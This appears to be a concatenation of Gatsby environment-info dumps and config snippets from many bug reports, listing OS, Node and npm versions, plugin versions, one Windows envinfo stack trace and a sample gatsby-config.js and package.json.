``` system: os: linux 4.17 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (8) x64 intel xeon processor (skylake, ibrs) shell: 4.4.12 - /bin/bash binaries: node: 8.14.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.1.4 => 2.1.4 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-manifest: ^2.0.17 => 2.0.17 gatsby-plugin-offline: ^2.0.23 => 2.0.23 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-plugin-sharp: ^2.0.20 => 2.0.20 gatsby-source-filesystem: ^2.0.20 => 2.0.20 gatsby-transformer-remark: 2.2.5 => 2.2.5 gatsby-transformer-sharp: ^2.1.13 => 2.1.13
system: os: macos 10.14 cpu: (4) x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.10.0 - /usr/local/bin/node yarn: 1.3.2 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /anaconda/bin/python browsers: chrome: 72.0.3626.109 safari: 12.0 npmpackages: gatsby: ^2.1.4 => 2.1.4 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-manifest: ^2.0.17 => 2.0.17 gatsby-plugin-offline: ^2.0.23 => 2.0.23 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-plugin-sass: ^2.0.10 => 2.0.10 gatsby-plugin-sharp: ^2.0.20 => 2.0.20 gatsby-source-filesystem: ^2.0.20 => 2.0.20 gatsby-transformer-sharp: ^2.1.13 => 2.1.13 npmglobalpackages: gatsby: 2.1.4
$ npx gatsby info --clipboard system: os: macos high sierra 10.13.4 cpu: (8) x64 intel(r) core(tm) i7-6920hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 11.9.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.5.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 65.0.3325.162 safari: 11.1 npmpackages: gatsby: ^2.0.118 => 2.0.118 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-emotion: ^4.0.3 => 4.0.3 gatsby-plugin-feed: ^2.0.13 => 2.0.13 gatsby-plugin-google-analytics: ^2.0.13 => 2.0.13 gatsby-plugin-manifest: ^2.0.17 => 2.0.17 gatsby-plugin-netlify: ^2.0.10 => 2.0.10 gatsby-plugin-offline: ^2.0.23 => 2.0.23 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-plugin-sass: ^2.0.10 => 2.0.10 gatsby-plugin-sharp: ^2.0.20 => 2.0.20 gatsby-remark-copy-linked-files: ^2.0.9 => 2.0.9 gatsby-remark-images: ^2.0.6 => 2.0.6 gatsby-remark-prismjs: ^3.2.4 => 3.2.4 gatsby-remark-responsive-iframe: ^2.0.9 => 2.0.9 gatsby-remark-smartypants: ^2.0.8 => 2.0.8 gatsby-source-filesystem: ^2.0.20 => 2.0.20 gatsby-source-ghost: ^3.3.0 => 3.3.0 gatsby-transformer-remark: ^2.2.4 => 2.2.4 gatsby-transformer-sharp: ^2.1.13 => 2.1.13 npmglobalpackages: gatsby-cli: 2.4.10
(if relevant) gatsby v1.9
system: os: macos 10.14.3 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 8.12.0 - ~/.nvm/versions/node/v8.12.0/bin/node yarn: 1.3.2 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v8.12.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 71.0.3578.98 firefox: 65.0 safari: 12.0.3 npmpackages: gatsby: ^2.0.91 => 2.0.91 gatsby-image: ^2.0.26 => 2.0.26 gatsby-plugin-eslint: ^2.0.3 => 2.0.3 gatsby-plugin-offline: ^2.0.21 => 2.0.21 gatsby-plugin-react-helmet: ^3.0.5 => 3.0.5 gatsby-plugin-react-svg: ^2.0.0 => 2.0.0 gatsby-plugin-sharp: ^2.0.17 => 2.0.17 gatsby-plugin-sitemap: ^2.0.4 => 2.0.4 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-plugin-webpack-size: ^0.0.3 => 0.0.3 gatsby-source-filesystem: ^2.0.16 => 2.0.16 gatsby-source-storyblok: ^0.1.2 => 0.1.3 gatsby-transformer-json: ^2.1.7 => 2.1.7 gatsby-transformer-remark: ^2.2.0 => 2.2.0 gatsby-transformer-sharp: ^2.1.10 => 2.1.10
run `npx gatsby info --clipboard` in your project directory and paste the output here
system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i5-6600k cpu @ 3.50ghz binaries: npm: 6.4.1 - d:\\software development\\languages, frameworks,
etc\ odejs\ pm.cmd languages: python: 3.7.0 - c:\\users\\conno\\appdata\\local\\programs\\python\\python37-32\\python.exe browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.118 => 2.0.118 gatsby-image: ^2.0.19 => 2.0.29 gatsby-plugin-buildtime-timezone: ^1.0.3 => 1.0.3 gatsby-plugin-manifest: ^2.0.7 => 2.0.17 gatsby-plugin-offline: ^2.0.23 => 2.0.23 gatsby-plugin-react-helmet: ^3.0.1 => 3.0.6 gatsby-plugin-sass: ^2.0.2 => 2.0.10 gatsby-plugin-sharp: ^2.0.11 => 2.0.20 gatsby-source-filesystem: ^2.0.6 => 2.0.20 gatsby-transformer-remark: ^2.2.4 => 2.2.4 gatsby-transformer-sharp: ^2.1.7 => 2.1.13 error the system cannot find the path specified
error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4970 - envinfo.js:1 object.copysync [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:6694 8 - envinfo.js:1 object.t.writesync.e [as writesync] [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4877 7 - envinfo.js:1 [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4693 4 - envinfo.js:1 promise.all.then.e [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4694 9 - util.js:16 trycatcher [childishhalbino.github.io]/[bluebird]/js/release/util.js:16 :23 - promise.js:512 promise._settlepromisefromhandler [childishhalbino.github.io]/[bluebird]/js/release/promise.js :512:31 - promise.js:569 promise._settlepromise [childishhalbino.github.io]/[bluebird]/js/release/promise.js :569:18 - promise.js:614 promise._settlepromise0 [childishhalbino.github.io]/[bluebird]/js/release/promise.js :614:10 - promise.js:694 promise._settlepromises [childishhalbino.github.io]/[bluebird]/js/release/promise.js :694:18 - promise.js:638 promise._fulfill [childishhalbino.github.io]/[bluebird]/js/release/promise.js :638:18 - promise_array.js:126 promisearray._resolve [childishhalbino.github.io]/[bluebird]/js/release/promise_ar ray.js:126:19 - promise_array.js:144 promisearray._promisefulfilled [childishhalbino.github.io]/[bluebird]/js/release/promise_ar ray.js:144:14 - promise.js:574 promise._settlepromise [childishhalbino.github.io]/[bluebird]/js/release/promise.js :574:26 - promise.js:614 promise._settlepromise0 [childishhalbino.github.io]/[bluebird]/js/release/promise.js :614:10 - promise.js:694 promise._settlepromises [childishhalbino.github.io]/[bluebird]/js/release/promise.js :694:18 error unhandled rejection error: the system cannot find the path specified
- envinfo.js:1 function.e.exports.sync [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4970 - envinfo.js:1 object.copysync [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:6694 8 - envinfo.js:1 object.t.writesync.e [as writesync] [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4877 7 - envinfo.js:1 [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4693 4 - envinfo.js:1 promise.all.then.e [childishhalbino.github.io]/[envinfo]/dist/envinfo.js:1:4694 9 - util.js:16 trycatcher [childishhalbino.github.io]/[bluebird]/js/release/util.js:16 :23 - promise.js:512 promise._settlepromisefromhandler [childishhalbino.github.io]/[bluebird]/js/release/promise.js :512:31 - promise.js:569 promise._settlepromise [childishhalbino.github.io]/[bluebird]/js/release/promise.js :569:18 - promise.js:614 promise._settlepromise0 [childishhalbino.github.io]/[bluebird]/js/release/promise.js :614:10 - promise.js:694 promise._settlepromises [childishhalbino.github.io]/[bluebird]/js/release/promise.js :694:18 - promise.js:638 promise._fulfill [childishhalbino.github.io]/[bluebird]/js/release/promise.js :638:18 - promise_array.js:126 promisearray._resolve [childishhalbino.github.io]/[bluebird]/js/release/promise_ar ray.js:126:19 - promise_array.js:144 promisearray._promisefulfilled [childishhalbino.github.io]/[bluebird]/js/release/promise_ar ray.js:144:14 - promise.js:574 promise._settlepromise [childishhalbino.github.io]/[bluebird]/js/release/promise.js :574:26 - promise.js:614 promise._settlepromise0 [childishhalbino.github.io]/[bluebird]/js/release/promise.js :614:10 - promise.js:694 promise._settlepromises [childishhalbino.github.io]/[bluebird]/js/release/promise.js :694:18
system: os: macos 10.14.2 cpu: (4) x64 intel(r) core(tm) i5-6267u cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 8.5.0 - /usr/local/bin/node npm: 5.3.0 - /usr/local/bin/npm browsers: chrome: 72.0.3626.81 firefox: 63.0.3 safari: 12.0.2 npmpackages: gatsby: ^2.0.76 => 2.0.76 gatsby-image: ^2.0.22 => 2.0.25 gatsby-plugin-feed: ^2.0.8 => 2.0.11 gatsby-plugin-google-analytics: ^2.0.5 => 2.0.8 gatsby-plugin-manifest: ^2.0.5 => 2.0.12 gatsby-plugin-netlify: ^2.0.6 => 2.0.6 gatsby-plugin-offline: ^2.0.5 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.5 gatsby-plugin-sharp: ^2.0.6 => 2.0.16 gatsby-plugin-sitemap: ^2.0.4 => 2.0.4 gatsby-plugin-typography: ^2.2.0 => 2.2.3 gatsby-remark-copy-linked-files: ^2.0.5 => 2.0.8 gatsby-remark-images: ^2.0.4 => 2.0.6 gatsby-remark-prismjs: ^3.0.0 => 3.1.4 gatsby-remark-responsive-iframe: ^2.0.5 => 2.0.8 gatsby-remark-smartypants: ^2.0.5 => 2.0.7 gatsby-source-filesystem: ^2.0.2 => 2.0.12 gatsby-source-mongodb: ^2.0.12 => 2.0.12 gatsby-transformer-remark: ^2.1.6 => 2.1.17 gatsby-transformer-sharp: ^2.1.3 => 2.1.9 gatsby-transformer-xml: ^2.0.6 => 2.0.6
binaries: node: 11.6.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.7.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 72.0.3626.81 safari: 12.0.2 npmpackages: gatsby: ^2.0.111 => 2.0.111 gatsby-cli: ^2.4.8 => 2.4.8 gatsby-image: ^2.0.29 => 2.0.29 gatsby-plugin-emotion: ^4.0.3 => 4.0.3 gatsby-plugin-feed: ^2.0.13 => 2.0.13 gatsby-plugin-google-analytics: ^2.0.13 => 2.0.13 gatsby-plugin-less: ^2.0.11 => 2.0.11 gatsby-plugin-lodash: ^3.0.4 => 3.0.4 gatsby-plugin-mailchimp: ^4.0.0 => 4.0.0 gatsby-plugin-manifest: ^2.0.17 => 2.0.17 gatsby-plugin-netlify: ^2.0.8 => 2.0.8 gatsby-plugin-offline: ^2.0.22 => 2.0.22 gatsby-plugin-react-helmet: ^3.0.6 => 3.0.6 gatsby-plugin-sharp: ^2.0.20 => 2.0.20 gatsby-plugin-sitemap: ^2.0.5 => 2.0.5 gatsby-plugin-typography: ^2.2.7 => 2.2.7 gatsby-remark-images: ^3.0.3 => 3.0.3 gatsby-source-filesystem: ^2.0.20 => 2.0.20 gatsby-source-firestore: ^1.0.3 => 1.0.3 gatsby-transformer-json: ^2.1.8 => 2.1.8 gatsby-transformer-remark: ^2.2.3 => 2.2.3 gatsby-transformer-sharp: ^2.1.13 => 2.1.13 npmglobalpackages: gatsby-cli: 2.4.8
(if relevant)
``` system: os: macos 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-8210y cpu @ 1.60ghz shell: 3.0.0 - /usr/local/bin/fish binaries: node: 10.15.0 - /var/folders/vh/cx86q1vs2xz5rxlf8b8cny2r0000gn/t/yarn--1548706327929-0.8647198662198463/node yarn: 1.13.0 - /var/folders/vh/cx86q1vs2xz5rxlf8b8cny2r0000gn/t/yarn--1548706327929-0.8647198662198463/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 71.0.3578.98 safari: 12.0.3 npmpackages: gatsby: 2.0.98 => 2.0.98 gatsby-plugin-layout: 1.0.11 => 1.0.11 gatsby-plugin-offline: 2.0.21 => 2.0.21 gatsby-plugin-react-helmet: 3.0.5 => 3.0.5 gatsby-plugin-styled-components: 3.0.4 => 3.0.4 gatsby-source-contentful: 2.0.26 => 2.0.26 gatsby-transformer-remark: 2.2.0 => 2.2.0 ``` `gatsby-config.js`:
plugins: [ { resolve: 'gatsby-plugin-styled-components', options: { displayname: false } }, 'gatsby-plugin-react-helmet', { resolve: 'gatsby-plugin-layout', options: { component: require.resolve('./src/components/layout') } }, { resolve: 'gatsby-source-contentful', options: { spaceid: '<spaceid>', accesstoken: process.env.contentful_access_token } }, { resolve: '@contentful/gatsby-transformer-contentful-richtext', options: contentfulrenderoptions }, 'gatsby-plugin-offline' ]
``` system: os: macos 10.14.1 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 10.7.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm browsers: chrome: 71.0.3578.98 firefox: 43.0.4 safari: 12.0.1 npmglobalpackages: gatsby-cli: 2.4.6 ```
``` system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 10.9.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.2.0 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 71.0.3578.98 firefox: 64.0.2 safari: 12.0.2 npmpackages: gatsby: ^2.0.98 => 2.0.98 gatsby-image: ^2.0.28 => 2.0.28 gatsby-plugin-manifest: ^2.0.13 => 2.0.13 gatsby-plugin-netlify-cms: ^3.0.10 => 3.0.10 gatsby-plugin-offline: ^2.0.21 => 2.0.21 gatsby-plugin-react-helmet: ^3.0.5 => 3.0.5 gatsby-plugin-sharp: ^2.0.18 => 2.0.18 gatsby-source-filesystem: ^2.0.17 => 2.0.17 gatsby-transformer-sharp: ^2.1.12 => 2.1.12 npmglobalpackages: gatsby-cli: 2.4.8
system: os: macos 10.14.3 cpu: (4) x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 5.0.2 - /usr/local/bin/bash
binaries: node: 10.15.0 - /usr/local/opt/node@10/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/opt/node@10/bin/npm
languages: python: 2.7.15 - /users/mitchellcash/.pyenv/shims/python
browsers: chrome: 71.0.3578.98 firefox: 64.0.2 safari: 12.0.3
npmpackages: gatsby: ^2.0.98 => 2.0.98 gatsby-image: ^2.0.28 => 2.0.28 gatsby-plugin-netlify: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.18 => 2.0.18 gatsby-remark-copy-linked-files: ^2.0.8 => 2.0.8 gatsby-remark-images: ^3.0.1 => 3.0.1 gatsby-source-filesystem: ^2.0.17 => 2.0.17 gatsby-transformer-remark: ^2.2.0 => 2.2.0 gatsby-transformer-sharp: ^2.1.12 => 2.1.12 npmglobalpackages: gatsby-cli: 2.4.8
``` system: os: macos 10.14.2 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.0.0 - /usr/local/bin/fish binaries: node: 11.7.0 - /usr/local/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.6.0 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 71.0.3578.98 firefox: 64.0.2 safari: 12.0.2 npmpackages: gatsby: ^2.0.0 => 2.0.97 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.5 gatsby-source-mongodb: ^2.0.5 => 2.0.10 gatsby-transformer-remark: ^2.1.1 => 2.2.0 npmglobalpackages: gatsby-cli: 2.4.8
got errors running this
i definitely have more than just edge installed...
i'm not a monster.
``` system: os: windows 10 cpu: (4) x64 intel(r) core(tm) i5-6300u cpu @ 2.40ghz binaries: npm: 6.5.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.76 => 2.0.76 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-offline: ^2.0.16 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-sharp: ^2.0.14 => 2.0.16 gatsby-source-contentful: ^2.0.26 => 2.0.26 gatsby-source-filesystem: ^2.0.8 => 2.0.12 gatsby-source-shopify: ^2.0.8 => 2.0.8 gatsby-transformer-sharp: ^2.1.8 => 2.1.9
system: os: macos 10.14.2 cpu: (4) x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 5.0.0 - /usr/local/bin/bash
binaries: node: 10.15.0 - /usr/local/opt/node@10/bin/node yarn: 1.13.0 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/opt/node@10/bin/npm
languages: python: 2.7.15 - /users/mitchellcash/.pyenv/shims/python
browsers: chrome: 71.0.3578.98 firefox: 64.0.2 safari: 12.0.2
npmpackages: gatsby: ^2.0.76 => 2.0.76 gatsby-plugin-typography: ^2.2.5 => 2.2.5 npmglobalpackages: gatsby-cli: 2.4.8
``` system: os: macos 10.14.2 cpu: (4) x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 11.6.0 - /usr/local/bin/node yarn: 1.12.3 - ~/.yarn/bin/yarn npm: 6.5.0 - /usr/local/bin/npm browsers: chrome: 71.0.3578.98 firefox: 64.0.2 safari: 12.0.2 npmpackages: gatsby: ^2.0.76 => 2.0.76 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-offline: ^2.0.16 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-sharp: ^2.0.14 => 2.0.16 gatsby-source-filesystem: ^2.0.8 => 2.0.12 gatsby-transformer-sharp: ^2.1.8 => 2.1.9 npmglobalpackages: gatsby-cli: 2.4.6
``` as well, i am testing this on an iphone and ipad on ios 12.1.2
`gatsby info --clipboard`:
``` system: os: macos high sierra 10.13.3 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.2.57 - /bin/bash binaries: node: 10.6.0 - ~/.nvm/versions/node/v10.6.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v10.6.0/bin/npm languages: python: 3.6.4 - /users/adu27/.pyenv/shims/python browsers: chrome: 71.0.3578.98 firefox: 62.0.3 safari: 11.0.3 npmpackages: gatsby: ^2.0.91 => 2.0.91 gatsby-image: ^2.0.19 => 2.0.19 gatsby-plugin-eslint: ^2.0.1 => 2.0.1 gatsby-plugin-manifest: ^2.0.2 => 2.0.2 gatsby-plugin-netlify-cms: ^3.0.3 => 3.0.3 gatsby-plugin-react-helmet: ^3.0.0 => 3.0.0 gatsby-plugin-sass: 2.0.1 => 2.0.1 gatsby-plugin-sharp: ^2.0.12 => 2.0.12 gatsby-plugin-twitter: ^2.0.6 => 2.0.6 gatsby-plugin-typography: ^2.2.0 => 2.2.0 gatsby-source-filesystem: ^2.0.2 => 2.0.2 gatsby-source-unsplash: ^1.1.0 => 1.1.0 gatsby-transformer-remark: ^2.1.6 => 2.1.6 gatsby-transformer-sharp: ^2.1.8 => 2.1.8 npmglobalpackages: gatsby-cli: 2.4.8
system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.0 - ~/.nvm/versions/node/v10.15.0/bin/node yarn: 1.13.0 - ~/.nvm/versions/node/v10.15.0/bin/yarn npm: 6.5.0 - ~/.nvm/versions/node/v10.15.0/bin/npm languages: python: 3.6.7 - /anaconda3/bin/python browsers: chrome: 71.0.3578.98 firefox: 64.0.2 safari: 12.0.2 npmpackages: gatsby: ^2.0.76 => 2.0.91 gatsby-image: ^2.0.20 => 2.0.26 gatsby-plugin-google-gtag: ^1.0.8 => 1.0.8 gatsby-plugin-manifest: ^2.0.9 => 2.0.13 gatsby-plugin-offline: ^2.0.16 => 2.0.21 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-sharp: ^2.0.14 => 2.0.17 gatsby-source-filesystem: ^2.0.8 => 2.0.16 gatsby-transformer-sharp: ^2.1.8 => 2.1.10 npmglobalpackages: gatsby-cli: 2.4.8
``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.4 - /usr/local/bin/node npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 71.0.3578.98 safari: 12.0.1 npmpackages: gatsby: ^2.0.76 => 2.0.76 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-offline: ^2.0.16 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-sharp: ^2.0.14 => 2.0.16 gatsby-source-filesystem: ^2.0.8 => 2.0.12 gatsby-source-wordpress: ^3.0.25 => 3.0.25 gatsby-transformer-sharp: ^2.1.8 => 2.1.9 npmglobalpackages: gatsby-cli: 2.4.7
**system**: os: linux 4.20 arch linux undefined cpu: (4) x64 intel(r) core(tm) i5-6200u cpu @ 2.30ghz shell: 4.4.23 - /bin/bash
**binaries**: node: 11.6.0 - /usr/bin/node yarn: 1.10.1 - ~/.yarn/bin/yarn npm: 6.5.0 - /usr/bin/npm
**languages**: python: 3.7.2 - /usr/bin/python
**browsers**: firefox: 64.0
**npmglobalpackages**: gatsby-cli: 2.4.8
(if relevant) ``` system: os: macos 10.14 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.9.4 - ~/.nvm/versions/node/v8.9.4/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.5.0 - ~/.nvm/versions/node/v8.9.4/bin/npm languages: python: 3.6.5 - /users/federman/anaconda3/bin/python browsers: chrome: 71.0.3578.98 firefox: 57.0.4 safari: 12.0 npmpackages: gatsby: ^2.0.83 => 2.0.83 gatsby-image: ^2.0.25 => 2.0.25 gatsby-mdx: ^0.2.0 => 0.2.0 gatsby-plugin-react-helmet: ^3.0.5 => 3.0.5 gatsby-plugin-sass: ^2.0.7 => 2.0.7 gatsby-plugin-sharp: ^2.0.17 => 2.0.17 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-source-contentful: ^2.0.22 => 2.0.22 gatsby-transformer-sharp: ^2.1.10 => 2.1.10 npmglobalpackages: gatsby-cli: 2.4.8 gatsby: 2.0.85
``` ### file contents (if changed) `gatsby-config.js`: ```
require("dotenv").config(); module.exports = { sitemetadata: { title: "spectrum website" }, plugins: [ `gatsby-transformer-sharp`, // for gatsby-image `gatsby-plugin-sharp`, `gatsby-plugin-react-helmet`, `gatsby-plugin-styled-components`, { resolve: `gatsby-mdx`, // for making markdown into html options: { extensions: [\'.md\', \'.mdx\'] }, }, \'@contentful/gatsby-transformer-contentful-richtext\', { resolve: `gatsby-plugin-sass`, options: { includepaths: ["node_modules/@spectrum/spectrum-css"], }, }, { resolve: `gatsby-source-contentful`, options: { spaceid: process.env.contentful_space_id, accesstoken: process.env.contentful_access_token } } ]
`package.json`: ```
{ "name": "spectrum-site-platform", "description": "spectrum documentation website", "version": "0.1.1", "author": "sarah federman <federman@adobe.com>", "dependencies": { "@contentful/gatsby-transformer-contentful-richtext": "^12.1.2", "@contentful/rich-text-html-renderer": "^10.3.0", "@contentful/rich-text-types": "^12.1.2", "@mdx-js/mdx": "^0.15.7", "@mdx-js/tag": "^0.15.6", "@react/react-spectrum": "^2.16.1", "@spectrum/spectrum-css": "^2.7.2", "@spectrum/spectrum-flexbox-grid": "^1.1.1", "babel-plugin-styled-components": "^1.10.0", "contentful": "^7.0.6", "core-js": "^2.6.1", "deepmerge": "^3.0.0", "dotenv": "^6.2.0", "escape-html": "^1.0.3", "gatsby": "^2.0.83", "gatsby-image": "^2.0.25", "gatsby-mdx": "^0.2.0", "gatsby-plugin-react-helmet": "^3.0.5", "gatsby-plugin-sass": "^2.0.7", "gatsby-plugin-sharp": "^2.0.17", "gatsby-plugin-styled-components": "^3.0.4", "gatsby-source-contentful": "^2.0.22", "gatsby-transformer-sharp": "^2.1.10", "node-sass": "^4.11.0", "npm-run-parallel": "^0.6.0", "nuka-carousel": "^4.4.5", "prop-types": "^15.6.2", "react": "^16.7.0", "react-dom": "^16.7.0", "react-helmet": "^5.2.0", "slugify": "^1.3.4", "styled-components": "^4.1.3" }, "keywords": [ "gatsby" ], "scripts": { "build": "npx gatsby build", "build:watch": "nodemon --watch src --exec \'npm run deploy\'", "serve": "npx gatsby serve", "deploy": "npm run build && npm run serve", "develop": "npx gatsby develop", "format": "prettier --write \'./src/**/*.js\'", "lint": "eslint \'./src/**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1" }, "lint-staged": { "src/**/*.{js,jsx}": [ "prettier --write", "git add", "eslint" ] }, "husky": { "hooks": { "pre-commit": "lint-staged" } }, "devdependencies": { "babel-eslint": "^9.0.0", "eslint": "^5.11.1", "eslint-config-prettier": "^3.3.0", "eslint-config-react-app": "^3.0.6", "eslint-plugin-babel": "^5.3.0", "eslint-plugin-import": "^2.14.0", "eslint-plugin-jsx-a11y": "^6.1.2", "eslint-plugin-prettier": "^3.0.1", "husky": "^1.3.1", "lint-staged": "^8.1.0", "nodemon": "^1.18.9", "prettier": "^1.15.3" }, "repository": { "type": "git", "url": " " }
my local setup is the following: ```
system: os: macos 10.14 cpu: (4) x64 intel(r) core(tm) i5-4258u cpu @ 2.40ghz shell: 3.2.57 - /bin/bash
binaries: node: 11.4.0 - /usr/local/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - /usr/local/bin/npm
languages: python: 2.7.10 - /users/delm/.pyenv/shims/python
browsers: chrome: 71.0.3578.98 firefox: 64.0 safari: 12.0
npmpackages: gatsby: ^2.0.85 => 2.0.85 gatsby-plugin-google-fonts: ^0.0.4 => 0.0.4 gatsby-plugin-react-helmet: ^3.0.5 => 3.0.5 gatsby-plugin-sass: ^2.0.7 => 2.0.7 gatsby-plugin-styled-components: ^3.0.4 => 3.0.4 gatsby-source-contentful: ^2.0.22 => 2.0.22 gatsby-transformer-remark: ^2.1.19 => 2.1.19
npmglobalpackages: gatsby-cli: 2.4.8
``` the issues can also be reproduced when running it locally.
gatsby v2.4.8, custom alpine linux 3.8 docker container, nodejs v10, custom built mozjpeg(v3.4.0 via cmake not autotools, functions correctly for jpg, only static and win32 optionally support png via cmake builds)
project is the default starter from `gatsby new`.
``` system: os: macos 10.14.2 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 4.4.12 - /usr/local/bin/bash binaries: node: 10.8.0 - ~/.nvm/versions/node/v10.8.0/bin/node yarn: 1.12.3 - ~/.nvm/versions/node/v10.8.0/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.8.0/bin/npm browsers: chrome: 71.0.3578.98 firefox: 64.0 safari: 12.0.2 npmpackages: gatsby: ^2.0.76 => 2.0.85 npmglobalpackages: gatsby-cli: 2.4.7
gatsbyjs.org
chrome browser
system: os: macos 10.14 cpu: x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.3 - /bin/zsh binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm browsers: safari: 12.0 npmpackages: gatsby: 2.0.24 => 2.0.24 gatsby-image: ^2.0.20 => 2.0.25 gatsby-plugin-manifest: ^2.0.9 => 2.0.12 gatsby-plugin-offline: ^2.0.16 => 2.0.20 gatsby-plugin-react-helmet: ^3.0.2 => 3.0.5 gatsby-plugin-sharp: ^2.0.14 => 2.0.16 gatsby-source-filesystem: ^2.0.8 => 2.0.12 gatsby-transformer-sharp: ^2.1.8 => 2.1.9
``` system: os: linux 4.18 pop!_os 18.10 cpu: (16) x64 amd ryzen 7 2700x eight-core processor shell: 5.5.1 - /usr/bin/zsh binaries: node: 10.14.2 - ~/.nvm/versions/node/v10.14.2/bin/node yarn: 1.12.3 - /usr/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.14.2/bin/npm browsers: chrome: 71.0.3578.98 firefox: 64.0 npmpackages: gatsby: ^2.0.74 => 2.0.74 gatsby-plugin-typography: ^2.2.3 => 2.2.3 npmglobalpackages: gatsby-cli: 2.4.7
